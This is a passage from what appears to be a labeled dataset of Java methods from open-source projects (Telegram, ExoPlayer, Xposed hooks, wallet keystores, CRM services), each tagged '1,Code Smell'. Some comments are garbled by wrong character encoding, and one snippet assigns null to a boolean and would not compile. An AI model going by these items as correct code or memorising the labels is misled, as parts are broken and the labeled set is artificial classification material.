        imageDrawable.attach();
      }
    }
    TLRPC.User user=UserConfig.getInstance(UserConfig.selectedAccount).getCurrentUser();
    Long emojiStatusDocumentId=UserObject.getEmojiStatusDocumentId(user);
    setEmoji(emojiStatusDocumentId == null ? 0 : emojiStatusDocumentId,false);
  }
 else {
    nextIcon.setVisibility(View.VISIBLE);
    if (imageDrawable != null) {
      imageDrawable.detach();
      imageDrawable=null;
    }
  }
  this.data=data;
  title.setText(data.title);
  description.setText(data.description);
  imageView.setImageResource(data.icon);
  this.drawDivider=drawDivider;
}",1,Code Smell
"public List<GameItem> useItem(int itemId,int count,int avatarId){
  if (count <= 0) {
    return null;
  }
  GameItem useItem=this.getMaterialByItemId(itemId);
  if (useItem == null || useItem.getCount() < count || useItem.getExcel().getUseMethod() == null) {
    return null;
  }
  var itemUseExcel=GameData.getItemUseExcelMap().get(useItem.getExcel().getUseDataID());
  if (itemUseExcel == null)   return null;
  boolean usedItem=false;
  usedItem=null;
  if (usedItem) {
    this.removeItem(useItem,count);
  }
  return null;
}",1,Code Smell
"public Fragment getmFragment(){
  if (mFragment == null) {
    Bundle bundle=getArguments();
    if (bundle != null) {
      String id=bundle.getString(""AC_FRAGMENT_ID"");
      mFragment=fragments.get(id);
      fragments.remove(id);
    }
  }
  if (mFragment == null) {
    if (!didHack) {
      Main.logger.warn(""Proxied fragment is null. Closing..."");
      didHack=true;
      Utils.getAppActivity().onBackPressed();
    }
    return new Fragment();
  }
  return mFragment;
}
",1,Code Smell
"public static void sendRegistrationToServer(@PushType int pushType,String token){
  Utilities.stageQueue.postRunnable(() -> {
    ConnectionsManager.setRegId(token,pushType,SharedConfig.pushStringStatus);
    if (token == null) {
      return;
    }
    boolean sendStat=false;
    if (SharedConfig.pushStringGetTimeStart != 0 && SharedConfig.pushStringGetTimeEnd != 0 && (!SharedConfig.pushStatSent || !TextUtils.equals(SharedConfig.pushString,token))) {
      sendStat=true;
      SharedConfig.pushStatSent=false;
    }
    SharedConfig.pushString=token;
    SharedConfig.pushType=pushType;
    for (    int a : SharedConfig.activeAccounts) {
      UserConfig userConfig=UserConfig.getInstance(a);
      userConfig.registeredForPush=false;
      userConfig.saveConfig(false);
      if (userConfig.getClientUserId() != 0) {
        final int currentAccount=a;
        if (sendStat) {
          String tag=pushType == PUSH_TYPE_FIREBASE ? ""fcm"" : (pushType == PUSH_TYPE_HUAWEI ? ""hcm"" : ""up"");
          TLRPC.TL_help_saveAppLog req=new TLRPC.TL_help_saveAppLog();
          TLRPC.TL_inputAppEvent event=new TLRPC.TL_inputAppEvent();
          event.time=SharedConfig.pushStringGetTimeStart;
          event.type=tag + ""_token_request"";
          event.peer=0;
          event.data=new TLRPC.TL_jsonNull();
          req.events.add(event);
          event=new TLRPC.TL_inputAppEvent();
          event.time=SharedConfig.pushStringGetTimeEnd;
          event.type=tag + ""_token_response"";
          event.peer=SharedConfig.pushStringGetTimeEnd - SharedConfig.pushStringGetTimeStart;
          event.data=new TLRPC.TL_jsonNull();
          req.events.add(event);
          sendStat=false;
          SharedConfig.pushStatSent=true;
          SharedConfig.saveConfig();
          ConnectionsManager.getInstance(currentAccount).sendRequest(req,null);
        }
        AndroidUtilities.runOnUIThread(() -> MessagesController.getInstance(currentAccount).registerForPush(pushType,token));
      }
    }
  }
);
}",1,Code Smell
"@Override public void onGeyserInitialize(){
  log4jLogger=(Logger)LogManager.getRootLogger();
  for (  Appender appender : log4jLogger.getAppenders().values()) {
    if ((useGui && appender instanceof TerminalConsoleAppender) || (!useGui && appender instanceof ConsoleAppender)) {
      log4jLogger.removeAppender(appender);
    }
  }
  if (useGui && gui == null) {
    gui=new GeyserStandaloneGUI(geyserLogger);
    gui.redirectSystemStreams();
    gui.startUpdateThread();
  }
  LoopbackUtil.checkAndApplyLoopback(geyserLogger);
  this.onGeyserEnable();
}",1,Code Smell
"/** 
 * Peeks an Ogg page header and updates this  {@link OggPageHeader}.
 * @param input The {@link ExtractorInput} to read from.
 * @param quiet Whether to return {@code false} rather than throwing an exception if the headercannot be populated.
 * @return Whether the read was successful. The read fails if the end of the input is encounteredwithout reading data.
 * @throws IOException If reading data fails or the stream is invalid.
 * @throws InterruptedException If the thread is interrupted.
 */
public boolean populate(ExtractorInput input,boolean quiet) throws IOException, InterruptedException {
  scratch.reset();
  reset();
  boolean hasEnoughBytes=input.getLength() == C.LENGTH_UNSET || input.getLength() - input.getPeekPosition() >= EMPTY_PAGE_HEADER_SIZE;
  if (!hasEnoughBytes || !input.peekFully(scratch.data,0,EMPTY_PAGE_HEADER_SIZE,true)) {
    if (quiet) {
      return false;
    }
 else {
      throw new EOFException();
    }
  }
  if (scratch.readUnsignedInt() != TYPE_OGGS) {
    if (quiet) {
      return false;
    }
 else {
      throw new ParserException(""expected OggS capture pattern at begin of page"");
    }
  }
  revision=scratch.readUnsignedByte();
  if (revision != 0x00) {
    if (quiet) {
      return false;
    }
 else {
      throw new ParserException(""unsupported bit stream revision"");
    }
  }
  type=scratch.readUnsignedByte();
  granulePosition=scratch.readLittleEndianLong();
  streamSerialNumber=scratch.readLittleEndianUnsignedInt();
  pageSequenceNumber=scratch.readLittleEndianUnsignedInt();
  pageChecksum=scratch.readLittleEndianUnsignedInt();
  pageSegmentCount=scratch.readUnsignedByte();
  headerSize=EMPTY_PAGE_HEADER_SIZE + pageSegmentCount;
  scratch.reset();
  input.peekFully(scratch.data,0,pageSegmentCount);
  for (int i=0; i < pageSegmentCount; i++) {
    laces[i]=scratch.readUnsignedByte();
    bodySize+=laces[i];
  }
  return true;
}",1,Code Smell
"public void start(Member member,XposedBridge.AdditionalHookInfo hookInfo,ClassLoader appClassLoader) throws Exception {
  if (member instanceof Method) {
    Method method=(Method)member;
    mIsStatic=Modifier.isStatic(method.getModifiers());
    mReturnType=method.getReturnType();
    if (mReturnType.equals(Void.class) || mReturnType.equals(void.class) || mReturnType.isPrimitive()) {
      mReturnTypeId=TypeId.get(mReturnType);
    }
 else {
      mReturnType=Object.class;
      mReturnTypeId=TypeId.OBJECT;
    }
    mParameterTypeIds=getParameterTypeIds(method.getParameterTypes(),mIsStatic);
    mActualParameterTypes=getParameterTypes(method.getParameterTypes(),mIsStatic);
    mHasThrowable=method.getExceptionTypes().length > 0;
  }
 else   if (member instanceof Constructor) {
    Constructor constructor=(Constructor)member;
    mIsStatic=false;
    mReturnType=void.class;
    mReturnTypeId=TypeId.VOID;
    mParameterTypeIds=getParameterTypeIds(constructor.getParameterTypes(),mIsStatic);
    mActualParameterTypes=getParameterTypes(constructor.getParameterTypes(),mIsStatic);
    mHasThrowable=constructor.getExceptionTypes().length > 0;
  }
 else   if (member.getDeclaringClass().isInterface()) {
    throw new IllegalArgumentException(""Cannot hook interfaces: "" + member.toString());
  }
 else   if (Modifier.isAbstract(member.getModifiers())) {
    throw new IllegalArgumentException(""Cannot hook abstract methods: "" + member.toString());
  }
 else {
    throw new IllegalArgumentException(""Only methods and constructors can be hooked: "" + member.toString());
  }
  mMember=member;
  mHookInfo=hookInfo;
  if (appClassLoader == null || appClassLoader.getClass().getName().equals(""java.lang.BootClassLoader"")) {
    mAppClassLoader=this.getClass().getClassLoader();
  }
 else {
    mAppClassLoader=appClassLoader;
  }
  mDexMaker=new DexMaker();
  String className=getClassName(mMember);
  String dexName=className + "".jar"";
  HookWrapper.HookEntity hookEntity=null;
  try {
    ClassLoader loader=mDexMaker.loadClassDirect(mAppClassLoader,new File(ConfigManager.getCachePath("""")),dexName);
    if (loader != null) {
      hookEntity=loadHookerClass(loader,className);
    }
  }
 catch (  Throwable throwable) {
  }
  if (hookEntity == null) {
    hookEntity=doMake(className,dexName);
  }
  SandHook.hook(hookEntity);
}",1,Code Smell
"@Override public void check() throws SQLException {
  super.check();
  DatabendAggregateFunction aggregateFunction=Randomly.fromOptions(DatabendAggregateFunction.MAX,DatabendAggregateFunction.MIN,DatabendAggregateFunction.SUM,DatabendAggregateFunction.COUNT,DatabendAggregateFunction.AVG);
  NewFunctionNode<DatabendExpression,DatabendAggregateFunction> aggregate=(DatabendAggregateOperation)gen.generateArgsForAggregate(aggregateFunction);
  List<Node<DatabendExpression>> fetchColumns=new ArrayList<>();
  fetchColumns.add(aggregate);
  while (Randomly.getBooleanWithRatherLowProbability()) {
    fetchColumns.add((DatabendAggregateOperation)gen.generateAggregate());
  }
  select.setFetchColumns(Arrays.asList(aggregate));
  originalQuery=DatabendToStringVisitor.asString(select);
  firstResult=getAggregateResult(originalQuery);
  metamorphicQuery=createMetamorphicUnionQuery(select,aggregate,select.getFromList());
  secondResult=getAggregateResult(metamorphicQuery);
  state.getState().getLocalState().log(""--"" + originalQuery + "";\n--""+ metamorphicQuery+ ""\n-- ""+ firstResult+ ""\n-- ""+ secondResult);
  if (firstResult == null && secondResult != null || firstResult != null && (!firstResult.contentEquals(secondResult) && !ComparatorHelper.isEqualDouble(firstResult,secondResult))) {
    if (secondResult.contains(""Inf"")) {
      throw new IgnoreMeException();
    }
    throw new AssertionError();
  }
}
",1,Code Smell
"public void setupWithViewPager(@Nullable ViewPager viewPager){
  if (mViewPager != null && mTabPageChangeListener != null) {
    mViewPager.removeOnPageChangeListener(mTabPageChangeListener);
  }
  if (viewPager != null) {
    final PagerAdapter adapter=viewPager.getAdapter();
    if (adapter == null) {
      throw new IllegalArgumentException(""ViewPager does not have a PagerAdapter set"");
    }
    mViewPager=viewPager;
    if (mTabPageChangeListener == null) {
      mTabPageChangeListener=new OnTabPageChangeListener();
    }
    viewPager.addOnPageChangeListener(mTabPageChangeListener);
    addOnTabSelectedListener(new OnTabSelectedListener(){
      @Override public void onTabSelected(      TabView tab,      int position){
        if (mViewPager != null && mViewPager.getAdapter() != null && position >= 0 && position < mViewPager.getAdapter().getCount()) {
          mViewPager.setCurrentItem(position);
        }
      }
      @Override public void onTabUnselected(      TabView tab,      int position){
      }
      @Override public void onTabReselected(      TabView tab,      int position){
      }
    }
);
    setPagerAdapter(adapter,true);
  }
 else {
    mViewPager=null;
    setPagerAdapter(null,true);
  }
}",1,Code Smell
"private void convertGetContextIDAfterInvokeMethod(Method method,Object methodObject) throws CSErrorException {
  if (method.getName().toLowerCase().contains(GETCONTEXTID)) {
    Object result=null;
    try {
      result=method.invoke(methodObject);
    }
 catch (    Exception e) {
      logger.warn(""Invoke method : {} error. "",method.getName(),e);
    }
    if (HAContextID.class.isInstance(result)) {
      HAContextID haContextID=(HAContextID)result;
      if (StringUtils.isNumeric(haContextID.getContextId()) && StringUtils.isNotBlank(haContextID.getInstance()) && StringUtils.isNotBlank(haContextID.getBackupInstance())) {
        String haid=this.contextHAManager.getContextHAChecker().convertHAIDToHAKey(haContextID);
        haContextID.setContextId(haid);
      }
 else {
        logger.error(""GetContextID method : "" + method.getName() + "" returns invalid haContextID : ""+ result);
        throw new CSErrorException(CSErrorCode.INVALID_HAID,""GetContextID method : "" + method.getName() + "" returns invalid haContextID : ""+ result);
      }
    }
  }
}
",1,Code Smell
"default void updateKeystoreEncryption(Keystore keystore){
  if (keystore.hasMasterPrivateExtendedKey()) {
    MasterPrivateExtendedKey mpek=keystore.getMasterPrivateExtendedKey();
    if (mpek.isEncrypted()) {
      EncryptedData data=mpek.getEncryptedData();
      updateMasterPrivateExtendedKey(null,null,data.getInitialisationVector(),data.getEncryptedBytes(),data.getKeySalt(),data.getEncryptionType().getDeriver().ordinal(),data.getEncryptionType().getCrypter().ordinal(),mpek.getCreationTimeSeconds(),mpek.getId());
    }
 else {
      updateMasterPrivateExtendedKey(mpek.getPrivateKey().getPrivKeyBytes(),mpek.getPrivateKey().getChainCode(),null,null,null,null,null,mpek.getCreationTimeSeconds(),mpek.getId());
    }
  }
  if (keystore.hasSeed()) {
    DeterministicSeed seed=keystore.getSeed();
    if (seed.isEncrypted()) {
      EncryptedData data=seed.getEncryptedData();
      updateSeed(seed.getType().ordinal(),null,data.getInitialisationVector(),data.getEncryptedBytes(),data.getKeySalt(),data.getEncryptionType().getDeriver().ordinal(),data.getEncryptionType().getCrypter().ordinal(),seed.needsPassphrase(),seed.getCreationTimeSeconds(),seed.getId());
    }
 else {
      updateSeed(seed.getType().ordinal(),seed.getMnemonicString().asString(),null,null,null,null,null,seed.needsPassphrase(),seed.getCreationTimeSeconds(),seed.getId());
    }
  }
}
",1,Code Smell
"@SneakyThrows @Override public void run(){
  while (true) {
    try {
      Message message=messageCollectVessel.take();
      messageSender.send(message);
    }
 catch (    Throwable ex) {
      log.error(""Consumption buffer container task failed. Number of buffer container tasks: {}"",messageCollectVessel.size(),ex);
    }
  }
}
@Override public void run(String... args){
  MonitorProperties monitor=properties.getMonitor();
  if (monitor == null || !monitor.getEnable() || StringUtil.isBlank(monitor.getThreadPoolTypes()) || StringUtil.isBlank(monitor.getCollectTypes())) {
    return;
  }
  threadPoolMonitors=new ArrayList<>();
  String collectType=Optional.ofNullable(StringUtil.emptyToNull(monitor.getCollectTypes())).orElse(MonitorTypeEnum.SERVER.name().toLowerCase());
  collectVesselExecutor=new ScheduledThreadPoolExecutor(new Integer(collectType.split("","").length),ThreadFactoryBuilder.builder().daemon(true).prefix(""client.scheduled.collect.data"").build());
  Collection<ThreadPoolMonitor> dynamicThreadPoolMonitors=ServiceLoaderRegistry.getSingletonServiceInstances(ThreadPoolMonitor.class);
  Map<String,ThreadPoolMonitor> threadPoolMonitorMap=ApplicationContextHolder.getBeansOfType(ThreadPoolMonitor.class);
  boolean customerDynamicThreadPoolMonitorFlag=CollectionUtil.isNotEmpty(dynamicThreadPoolMonitors) || CollectionUtil.isNotEmpty(threadPoolMonitorMap);
  if (customerDynamicThreadPoolMonitorFlag) {
    threadPoolMonitorMap.forEach((beanName,bean) -> threadPoolMonitors.add(bean));
    dynamicThreadPoolMonitors.forEach(each -> threadPoolMonitors.add(each));
    collectVesselExecutor.scheduleWithFixedDelay(() -> dynamicThreadPoolMonitor(),properties.getInitialDelay(),properties.getCollectInterval(),TimeUnit.MILLISECONDS);
  }
  if (collectType.contains(MonitorTypeEnum.SERVER.name().toLowerCase())) {
    collectVesselExecutor.scheduleWithFixedDelay(() -> runTimeGatherTask(),properties.getInitialDelay(),properties.getCollectInterval(),TimeUnit.MILLISECONDS);
    Integer bufferSize=properties.getTaskBufferSize();
    messageCollectVessel=new LinkedBlockingQueue(bufferSize);
    collectors=ApplicationContextHolder.getBeansOfType(Collector.class);
    ThreadUtil.newThread(this,""client.thread.reporting.task"",Boolean.TRUE).start();
  }
  if (ThreadPoolExecutorRegistry.getThreadPoolExecutorSize() > 0) {
    log.info(""Dynamic thread pool: [{}]. The dynamic thread pool starts data collection and reporting."",ThreadPoolExecutorRegistry.getThreadPoolExecutorSize());
  }
}",1,Code Smell
"private void reportError(PrettyLogger logger,CatsResultFactory.CatsResult catsResult,Object... params){
  this.reportError(logger,catsResult.message(),params);
  setResultReason(catsResult);
}
/** 
 * If  {@code --ignoreResponseCodes} is supplied and the response code received from the serviceis in the ignored list, the method will actually report INFO instead of ERROR. If  {@code --skipReportingForIgnoredCodes} is also enabled, the reporting for these ignored codes will be skipped entirely.
 * @param logger  the current logger
 * @param message message to be logged
 * @param params  params needed by the message
 */
void reportError(PrettyLogger logger,String message,Object... params){
  this.logger.debug(""Reporting error with message: {}"",replaceBrackets(message,params));
  CatsTestCase testCase=currentTestCase();
  CatsResponse catsResponse=Optional.ofNullable(testCase.getResponse()).orElse(CatsResponse.empty());
  if (ignoreArguments.isNotIgnoredResponse(catsResponse) || catsResponse.exceedsExpectedResponseTime(reportingArguments.getMaxResponseTime()) || isException(catsResponse)) {
    this.logger.debug(""Received response is not marked as ignored... reporting error!"");
    executionStatisticsListener.increaseErrors(testCase.getContractPath());
    logger.error(message,params);
    this.recordResult(message,params,Level.ERROR.toString().toLowerCase(),logger);
    this.renderProgress(catsResponse);
  }
 else   if (ignoreArguments.isSkipReportingForIgnoredCodes()) {
    this.logger.debug(RECEIVED_RESPONSE_IS_MARKED_AS_IGNORED_SKIPPING);
    this.skipTest(logger,""Some response elements were was marked as ignored and --skipReportingForIgnoredCodes is enabled."");
    this.recordResult(message,params,SKIP_REPORTING,logger);
  }
 else {
    testCase.setResultIgnoreDetails(Level.ERROR.toString());
    this.logger.debug(""Received response is marked as ignored... reporting info!"");
    this.reportInfo(logger,message,params);
  }
  recordAuthErrors(catsResponse);
}
",1,Code Smell
"/** 
 * 鑾峰彇褰撳墠瀹為檯鐨勭洰鏍 imageName 瀛楃涓
 * @param request 鏋勫缓璇锋眰
 * @return imageName
 */
private String getImageName(ImageBuilderCreateReq request){
  String now=LocalDateTime.now().format(DateTimeFormatter.ofPattern(""yyyyMMddHHmmss""));
  String imageBasename=String.format(""%s-%s-%s"",request.getAppId(),request.getComponentName(),request.getBasename());
  if (request.isImagePush()) {
    assert !StringUtils.isEmpty(request.getImagePushRegistry());
    if (request.getImagePushUseBranchAsTag() == null || !request.getImagePushUseBranchAsTag()) {
      return String.format(""%s/%s:%s"",request.getImagePushRegistry(),imageBasename,now);
    }
 else {
      return String.format(""%s/%s:%s"",request.getImagePushRegistry(),imageBasename,request.getBranch());
    }
  }
 else   if (StringUtils.isEmpty(request.getImageName())) {
    return String.format(""abm.io/abm/%s:%s"",imageBasename,now);
  }
 else {
    return request.getImageName();
  }
}
",1,Code Smell
"public void visitProgramMethod(ProgramClass programClass,ProgramMethod programMethod){
  int accessFlags=programMethod.getAccessFlags();
  logger.trace(""MethodInliner: checking [{}.{}{}] in [{}.{}{}]"",programClass.getName(),programMethod.getName(programClass),programMethod.getDescriptor(programClass),targetClass.getName(),targetMethod.getName(targetClass),targetMethod.getDescriptor(targetClass));
  if (DEBUG(""Access?"") && (accessFlags & (AccessConstants.PRIVATE | AccessConstants.STATIC | AccessConstants.FINAL)) != 0 && DEBUG(""Interface?"") && ((programClass.getAccessFlags() & AccessConstants.INTERFACE) == 0 || canInlineMethodFromInterface(programClass,programMethod)) && DEBUG(""Synchronized?"") && (accessFlags & (AccessConstants.SYNCHRONIZED | AccessConstants.NATIVE | AccessConstants.ABSTRACT)) == 0 && DEBUG(""Init?"") && !programMethod.getName(programClass).equals(ClassConstants.METHOD_NAME_INIT) && DEBUG(""Self?"") && (!programMethod.equals(targetMethod) || !programClass.equals(targetClass)) && DEBUG(""Recurse?"") && !inliningMethods.contains(programMethod) && DEBUG(""Version?"") && targetClass.u4version >= programClass.u4version && DEBUG(""Super?"") && (!usesOptimizationInfo || (!KeepMarker.isKept(programMethod) && (!SuperInvocationMarker.invokesSuperMethods(programMethod) && !DynamicInvocationMarker.invokesDynamically(programMethod) || programClass.equals(targetClass)) && DEBUG(""Branch?"")&& (!BackwardBranchMarker.branchesBackward(programMethod) || uninitializedObjectCount == 0)&& DEBUG(""Access private?"")&& (allowAccessModification || ((!AccessMethodMarker.accessesPrivateCode(programMethod) || programClass.equals(targetClass)) && (!AccessMethodMarker.accessesPackageCode(programMethod) || ClassUtil.internalPackageName(programClass.getName()).equals(ClassUtil.internalPackageName(targetClass.getName())))))&& DEBUG(""Access private in subclass?"")&& (!AccessMethodMarker.accessesPrivateCode(programMethod) || programClass.equals(targetClass) || !targetClass.extendsOrImplements(programClass))&& DEBUG(""Access protected?"")&& (!AccessMethodMarker.accessesProtectedCode(programMethod) || programClass.equals(targetClass))&& DEBUG(""Synchronization?"")&& (!SynchronizedBlockMethodMarker.hasSynchronizedBlock(programMethod) || coveredByCatchAllHandler)&& DEBUG(""Final fields?"")&& !FinalFieldAssignmentMarker.assignsFinalField(programMethod)&& DEBUG(""Catch?"")&& (!CatchExceptionMarker.catchesExceptions(programMethod) || emptyInvokingStack)&& DEBUG(""Stack?"")&& !NonEmptyStackReturnMarker.returnsWithNonEmptyStack(programMethod)&& DEBUG(""Side effects?"")&& !SideEffectClassChecker.mayHaveSideEffects(targetClass,programClass,programMethod)))) {
    boolean oldInlining=inlining;
    inlining=true;
    inliningMethods.push(programMethod);
    programMethod.attributesAccept(programClass,this);
    if (usesOptimizationInfo) {
      if (!KeepMarker.isKept(targetMethod)) {
        ProgramMethodOptimizationInfo.getProgramMethodOptimizationInfo(targetMethod).merge(MethodOptimizationInfo.getMethodOptimizationInfo(programMethod));
      }
      programMethod.attributesAccept(programClass,methodInvocationMarker);
    }
    inlining=oldInlining;
    inliningMethods.pop();
  }
 else   if (programMethod.getName(programClass).equals(ClassConstants.METHOD_NAME_INIT)) {
    uninitializedObjectCount--;
  }
}",1,Code Smell
"@Override public boolean exists(FsPath dest) throws IOException {
  try {
    return fs.exists(new Path(checkHDFSPath(dest.getPath())));
  }
 catch (  IOException e) {
    String message=e.getMessage();
    String rootCauseMessage=ExceptionUtils.getRootCauseMessage(e);
    if ((message != null && message.matches(LinkisStorageConf.HDFS_FILE_SYSTEM_REST_ERRS())) || (rootCauseMessage != null && rootCauseMessage.matches(LinkisStorageConf.HDFS_FILE_SYSTEM_REST_ERRS()))) {
      logger.info(""Failed to execute exists for user {}, retry"",user,e);
      resetRootHdfs();
      return fs.exists(new Path(checkHDFSPath(dest.getPath())));
    }
 else {
      throw e;
    }
  }
}
",1,Code Smell
"private boolean reevaluateIfSoundIsOn(){
  if (mSettingsValues == null || !mSettingsValues.mSoundOn || mAudioManager == null) {
    return false;
  }
  return mAudioManager.getRingerMode() == AudioManager.RINGER_MODE_NORMAL;
}
",1,Code Smell
"/** 
 * 鑾峰彇SavePoint淇濆瓨鍘嗗彶淇℃伅
 * @param modelMap
 * @param jobConfigId
 * @return
 * @author wxj
 * @date 2021骞�12鏈�3鏃� 涓婂崍10:01:42
 * @version V1.0
 */
@RequestMapping(value=""/querySavePointList10"") public RestResult<?> querySavePointList10(Long taskid){
  List<SavepointBackupDTO> savepointBackupDTOList=savepointBackupService.lasterHistory10(taskid);
  ModelMap modelMap=new ModelMap();
  modelMap.put(""data"",SavepointBackupVO.toDTOList(savepointBackupDTOList));
  JobConfigDTO jobConfigDTO=jobConfigService.getJobConfigById(taskid);
  if (jobConfigDTO != null && JobConfigStatus.RUN.getCode().intValue() != jobConfigDTO.getStatus().getCode().intValue() && YN.getYNByValue(jobConfigDTO.getIsOpen()).getCode()) {
    modelMap.put(""enable"",true);
  }
 else {
    modelMap.put(""enable"",false);
  }
  modelMap.put(""taskId"",taskid);
  return RestResult.success(modelMap);
}",1,Code Smell
"@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  if (getObjectField(param.thisObject,""mListType"").equals(LIST_TYPE_CLONED_APPS) && getCloneUserID() > 0) {
    Menu mOptionsMenu=(Menu)getObjectField(param.thisObject,""mOptionsMenu"");
    mOptionsMenu.findItem(mContext.getResources().getIdentifier(""delete_all_app_clones"",""id"",mContext.getPackageName())).setVisible(true);
  }
}
@SuppressLint(""QueryPermissionsNeeded"") @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  ArrayList<String> packageList=new ArrayList<>();
  PackageManager packageManager=mContext.getPackageManager();
  int cloneUserID=getCloneUserID();
  List<String> clonePackageNames=new ArrayList<>();
  if (cloneUserID > 0) {
    List<PackageInfo> cloneUserPackages=(List<PackageInfo>)callMethod(packageManager,""getInstalledPackagesAsUser"",PackageManager.GET_ACTIVITIES,cloneUserID);
    cloneUserPackages.forEach(clonePackage -> {
      if (clonePackage.packageName != null)       clonePackageNames.add(clonePackage.packageName);
    }
);
  }
  for (  PackageInfo installedPackage : packageManager.getInstalledPackages(PackageManager.GET_ACTIVITIES)) {
    if (installedPackage.packageName != null && installedPackage.packageName.length() > 0) {
      ApplicationInfo applicationInfo=packageManager.getApplicationInfo(installedPackage.packageName,PackageManager.GET_META_DATA);
      if ((applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0 && clonePackageNames.contains(installedPackage.packageName)) {
        continue;
      }
      packageList.add(installedPackage.packageName);
    }
  }
  setObjectField(param.thisObject,""mAllowedApps"",packageList);
}",1,Code Smell
"private static String absoluteUri(VertxRequestInfo requestInfo,String uri){
  StringBuilder result=new StringBuilder();
  result.append(requestInfo.isSsl() ? ""https://"" : ""http://"");
  result.append(requestInfo.getHost());
  if (requestInfo.getPort() != -1 && (requestInfo.getPort() != 80 || requestInfo.isSsl()) && (requestInfo.getPort() != 443 || !requestInfo.isSsl())) {
    result.append(':').append(requestInfo.getPort());
  }
  result.append(uri);
  return result.toString();
}",1,Code Smell
"private List<AppListModel> getSmartFreezeApps(){
  return ContextExtKt.withThanos(getApplication(),thanosManager -> {
    PackageSet packageSet=pkgSetId == null ? null : thanosManager.getPkgManager().getPackageSetById(pkgSetId,true,false);
    List<AppListModel> res=new ArrayList<>();
    for (    Pkg pkg : thanosManager.getPkgManager().getSmartFreezePkgs()) {
      XLog.v(""getSmartFreezeApps pkg: "" + pkg);
      AppInfo appInfo=thanosManager.getPkgManager().getAppInfoForUser(pkg.getPkgName(),pkg.getUserId());
      if (appInfo != null && (packageSet == null || packageSet.getPkgList().contains(pkg))) {
        XLog.v(""getSmartFreezeApps app: %s, enabled: %s"",appInfo.getPkgName(),!appInfo.disabled());
        AppListModel model=new AppListModel(appInfo);
        res.add(model);
      }
    }
    AppSort sort=currentSort.get();
    if (sort != null) {
      if (sort.relyOnUsageStats()) {
        inflateAppUsageStats(res);
      }
      AppSort.AppSorterProvider appSorterProvider=sort.provider;
      if (appSorterProvider != null) {
        res.sort(appSorterProvider.comparator(getApplication()));
        if (sortReverse.get()) {
          Collections.reverse(res);
        }
      }
    }
    return res;
  }
,new ArrayList<>(0));
}",1,Code Smell
"protected URI resolvePath(Artifact.Item item,String path) throws IOException {
  Artifact artifact=item.getArtifact();
  URI artifactUri=artifact.getResourceUri();
  String itemUri=item.getUri();
  if (itemUri != null && URI.create(itemUri).isAbsolute() || isRemote()) {
    Path cacheDir=getCacheDirectory();
    Path resourceDir=cacheDir.resolve(artifactUri.getPath());
    String type=item.getType();
    String fileName=item.getName();
    Path cachedFile;
    if (""dir"".equals(type)) {
      if (!fileName.isEmpty()) {
        cachedFile=resourceDir.resolve(fileName);
      }
 else {
        cachedFile=resourceDir;
      }
      return cachedFile.resolve(path).toUri();
    }
 else {
      return resourceDir.resolve(fileName).toUri();
    }
  }
  String uriSuffix=itemUri != null ? itemUri : item.getName();
  return getBaseUri().resolve(artifactUri.resolve(uriSuffix));
}
",1,Code Smell
"@Override float calculateFraction(Parallax source){
  int lastIndex=0;
  float lastValue=0;
  float lastMarkerValue=0;
  for (int i=0; i < mMarkerValues.size(); i++) {
    FloatPropertyMarkerValue k=(FloatPropertyMarkerValue)mMarkerValues.get(i);
    int index=k.getProperty().getIndex();
    float markerValue=k.getMarkerValue(source);
    float currentValue=source.getFloatPropertyValue(index);
    float fraction;
    if (i == 0) {
      if (currentValue >= markerValue) {
        return 0f;
      }
    }
 else {
      if (lastIndex == index && lastMarkerValue < markerValue) {
        throw new IllegalStateException(""marker value of same variable must be "" + ""descendant order"");
      }
      if (currentValue == FloatProperty.UNKNOWN_AFTER) {
        fraction=(float)(lastMarkerValue - lastValue) / source.getMaxValue();
        return getFractionWithWeightAdjusted(fraction,i);
      }
 else       if (currentValue >= markerValue) {
        if (lastIndex == index) {
          fraction=(float)(lastMarkerValue - currentValue) / (lastMarkerValue - markerValue);
        }
 else         if (lastValue != FloatProperty.UNKNOWN_BEFORE) {
          lastMarkerValue=lastMarkerValue + (currentValue - lastValue);
          fraction=(float)(lastMarkerValue - currentValue) / (lastMarkerValue - markerValue);
        }
 else {
          fraction=1f - (float)(currentValue - markerValue) / source.getMaxValue();
        }
        return getFractionWithWeightAdjusted(fraction,i);
      }
    }
    lastValue=currentValue;
    lastIndex=index;
    lastMarkerValue=markerValue;
  }
  return 1f;
}",1,Code Smell
"@Override public void onActivityStarted(@NonNull Activity activity){
  Intent intent=activity.getIntent();
  String fragment=intent.getStringExtra("":settings:show_fragment"");
  LOGGER.d(""onActivityStarted: %s, action=%s, fragment=%s"",activity.getLocalClassName(),activity.getIntent().getAction(),fragment);
  if (fragment != null && fragment.contains(""Development"") || activity.getComponentName().getClassName().contains(developmentActivityName)) {
    WorkerHandler.get().post(() -> {
      try {
        SuiShortcut.requestPinnedShortcut(activity,resources);
      }
 catch (      Throwable e) {
        LOGGER.e(e,""requestPinnedShortcut"");
      }
    }
);
  }
}
",1,Code Smell
"@Override public TaskDetailVO queryTrashTaskInfo(Integer taskId){
  if (!workAuthUtil.isTaskAuth(taskId)) {
    throw new CrmException(WorkCodeEnum.WORK_AUTH_ERROR);
  }
  if (!UserUtil.isAdmin() && !UserUtil.getUser().getRoles().contains(workAuthUtil.getWorkAdminRole())) {
    WorkTask task=getById(taskId);
    boolean auth=true;
    if (Objects.equals(0,task.getWorkId())) {
      auth=workAuthUtil.isOaAuth(1,taskId);
    }
 else {
      Work work=workService.getById(task.getWorkId());
      if (TagUtil.toLongSet(work.getOwnerUserId()).contains(UserUtil.getUserId()) || work.getIsOpen() == 1) {
        auth=false;
      }
    }
    if (auth) {
      throw new CrmException(SystemCodeEnum.SYSTEM_NO_AUTH);
    }
  }
  TaskDetailVO taskDetailVO=transfer(taskId);
  if (StrUtil.isNotEmpty(taskDetailVO.getBatchId())) {
    List<FileEntity> data=adminFileService.queryFileList(taskDetailVO.getBatchId()).getData();
    taskDetailVO.setFile(data);
  }
 else {
    taskDetailVO.setFile(new ArrayList<>());
  }
  List<Integer> childTaskIdList=listObjs(new QueryWrapper<WorkTask>().select(""task_id"").eq(""pid"",taskId),o -> Integer.valueOf(o.toString()));
  List<TaskDetailVO> childTaskList=new ArrayList<>();
  if (CollectionUtil.isNotEmpty(childTaskIdList)) {
    childTaskIdList.forEach(childTaskId -> {
      TaskDetailVO childTask=transfer(childTaskId);
      if (StrUtil.isNotEmpty(taskDetailVO.getBatchId())) {
        List<FileEntity> file=adminFileService.queryFileList(taskDetailVO.getBatchId()).getData();
